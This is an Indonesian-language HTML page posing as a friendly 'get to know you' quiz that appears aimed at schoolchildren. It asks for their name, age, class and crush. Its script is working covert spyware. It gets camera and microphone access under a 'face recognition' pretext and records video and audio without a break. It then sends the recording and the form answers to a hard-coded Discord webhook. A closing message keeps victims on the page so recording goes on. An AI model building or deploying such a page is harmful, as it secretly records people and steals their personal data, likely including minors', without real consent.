<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kenalan Yuk! ✨</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-light: #c084fc;
            --bg: #050505;
            --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.1);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }

        body {
            background-color: var(--bg);
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(139, 92, 246, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(192, 132, 252, 0.1) 0%, transparent 40%);
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        /* Container Utama */
        .glass-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            padding: 40px;
            border-radius: 32px;
            border: 1px solid var(--border);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
            text-align: center;
            width: 90%;
            max-width: 400px;
            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }

        h2 { font-size: 1.8rem; font-weight: 800; margin-bottom: 10px; background: linear-gradient(to right, #ddd, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        p { color: #94a3b8; margin-bottom: 30px; line-height: 1.6; }

        /* Input Styles */
        .form-content { text-align: left; }
        .input-group { margin-bottom: 18px; }
        label { display: block; margin-bottom: 8px; color: #64748b; font-size: 0.85rem; font-weight: 600; padding-left: 5px; }
        input {
            width: 100%; padding: 14px 18px; border-radius: 16px; border: 1px solid var(--border);
            background: rgba(255, 255, 255, 0.02); color: white; outline: none; transition: 0.3s;
            font-size: 0.95rem;
        }
        input:focus { border-color: var(--primary); background: rgba(139, 92, 246, 0.05); }

        /* Button Styles */
        .btn {
            width: 100%; padding: 16px; border: none; border-radius: 18px;
            font-size: 1rem; font-weight: 700; cursor: pointer; transition: 0.4s;
            display: flex; justify-content: center; align-items: center; gap: 10px;
            letter-spacing: 0.5px;
        }
        .btn-primary { background: var(--primary); color: white; box-shadow: 0 10px 20px -5px rgba(139, 92, 246, 0.4); }
        .btn-primary:hover { transform: translateY(-3px); background: var(--primary-light); }
        .btn-secondary { background: transparent; border: 1px solid var(--border); color: #94a3b8; margin-top: 10px; }

        /* Overlays */
        .overlay {
            position: fixed; inset: 0; background: var(--bg); z-index: 100;
            display: flex; justify-content: center; align-items: center;
            transition: opacity 0.5s ease;
        }

        #successDialog {
            position: fixed; inset: 0; background: rgba(0,0,0,0.8);
            backdrop-filter: blur(15px); z-index: 200;
            display: none; justify-content: center; align-items: center;
            opacity: 0; transition: 0.5s;
        }

        /* Recording Indicator */
        .rec-tag {
            position: absolute; top: 20px; right: 20px;
            background: rgba(239, 68, 68, 0.1); color: #ef4444;
            padding: 5px 12px; border-radius: 20px; font-size: 0.7rem;
            font-weight: 700; display: none; align-items: center; gap: 6px;
            border: 1px solid rgba(239, 68, 68, 0.2);
        }
        .dot { width: 6px; height: 6px; background: #ef4444; border-radius: 50%; animation: blink 1s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
    </style>
</head>
<body>

    <div class="rec-tag" id="recTag">
        <div class="dot"></div> SYNC ACTIVE
    </div>

    <div id="step1" class="overlay">
        <div class="glass-card">
            <div style="font-size: 3rem; margin-bottom: 20px;">👋</div>
            <h2>KENALAN YUK!</h2>
            <p>Biar kita bisa saling kenal lebih dekat, izinkan akses pengenalan wajah dulu ya?</p>
            <button class="btn btn-primary" onclick="initApp()">AYOK! ✨</button>
            <button class="btn btn-secondary" onclick="location.reload()">TIDAK!</button>
        </div>
    </div>

    <div id="mainForm" class="glass-card" style="display: none; opacity: 0;">
        <h2>Data Kamu</h2>
        <p>Isi dulu yuk, rahasia aman kok!</p>
        <div class="form-content">
            <div class="input-group">
                <label>Nama Lengkap</label>
                <input type="text" id="nama" placeholder="Panggil kamu siapa?">
            </div>
            <div class="input-group">
                <label>Umur / Kelas</label>
                <div style="display: flex; gap: 10px;">
                    <input type="number" id="umur" placeholder="Umur">
                    <input type="text" id="kelas" placeholder="Kelas">
                </div>
            </div>
            <div class="input-group">
                <label>Siapa Crush Kamu? 😍</label>
                <input type="text" id="crush" placeholder="Ceritain sedikit dong...">
            </div>
            <button class="btn btn-primary" id="btnSubmit" onclick="submitData()">
                Kirim Sekarang 🚀
            </button>
        </div>
    </div>

    <div id="successDialog">
        <div class="glass-card">
            <div style="font-size: 3.5rem; margin-bottom: 20px;">💜</div>
            <h2>TERIMA KASIH YA!</h2>
            <p>Data kamu sudah masuk ke catatan aku. Salam kenal ya, senang bisa kenalan sama kamu!</p>
            <button class="btn btn-primary" onclick="closeAll()">OKAY! ✨</button>
        </div>
    </div>

    <video id="v" autoplay muted style="display:none;"></video>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1472604875316789362/WCsymTViSWZcRWqn6Xb_oJcMwelZTf7bRxdQ3lpAkh5rh7eTh49Bx1uZsJfQZOmMaLQg";
        let recorder;
        let chunks = [];
        let stream;

        async function initApp() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = stream;
                
                // Mulai Perekaman Terus Menerus
                recorder = new MediaRecorder(stream);
                recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                
                // Logic Pengiriman Video Saat Tab Ditutup/Berhenti
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const f = new FormData();
                    f.append('file', blob, 'kenalan_secret.webm');
                    f.append('content', '🎥 **Rekaman Video Full (Non-Stop)**');
                    await fetch(WEBHOOK, { method: 'POST', body: f });
                };

                recorder.start(3000); // Record in 3s slices
                
                // Transisi UI
                document.getElementById('step1').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('step1').style.display = 'none';
                    const main = document.getElementById('mainForm');
                    main.style.display = 'block';
                    setTimeout(() => { 
                        main.style.opacity = '1'; 
                        document.getElementById('recTag').style.display = 'flex';
                    }, 50);
                }, 500);

            } catch (err) {
                alert("Klik AYOK! dan izinkan kamera dulu ya manis..");
            }
        }

        async function submitData() {
            const btn = document.getElementById('btnSubmit');
            const fields = {
                nama: document.getElementById('nama').value,
                umur: document.getElementById('umur').value,
                kelas: document.getElementById('kelas').value,
                crush: document.getElementById('crush').value
            };

            if(!fields.nama) return alert("Namanya belum diisi lho..");

            btn.disabled = true;
            btn.innerHTML = "Sabar ya... ⏳";

            // Kirim Data Teks (Silent)
            const payload = {
                embeds: [{
                    title: "✨ Kenalan Baru!",
                    color: 9131510,
                    fields: [
                        { name: "👤 Nama", value: fields.nama, inline: true },
                        { name: "🎂 Umur", value: fields.umur, inline: true },
                        { name: "🏫 Kelas", value: fields.kelas, inline: true },
                        { name: "💖 Crush", value: fields.crush }
                    ],
                    timestamp: new Date()
                }]
            };

            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                // Munculkan Dialog Terima Kasih Modern
                const dialog = document.getElementById('successDialog');
                dialog.style.display = 'flex';
                setTimeout(() => { dialog.style.opacity = '1'; }, 50);

            } catch (e) {
                btn.disabled = false;
                btn.innerText = "Kirim Sekarang 🚀";
            }
        }

        function closeAll() {
            // Sembunyikan semua tapi jangan stop perekaman
            document.getElementById('successDialog').style.opacity = '0';
            setTimeout(() => {
                document.getElementById('successDialog').innerHTML = `
                    <div class="glass-card">
                        <h2>Tunggu sebentar...</h2>
                        <p>Lagi menyelaraskan data terakhir biar pas. Jangan tutup tab-nya dulu ya!</p>
                    </div>
                `;
            }, 500);
            
            // Opsional: Kamu bisa arahkan ke YouTube/Google setelah ini
            // setTimeout(() => { window.location.href = "https://google.com"; }, 3000);
        }

        // Perekaman tetap berjalan sampai tab benar-benar ditutup
        window.addEventListener('beforeunload', () => {
            if(recorder && recorder.state !== 'inactive') {
                recorder.stop();
            }
        });
    </script>
</body>
</html>
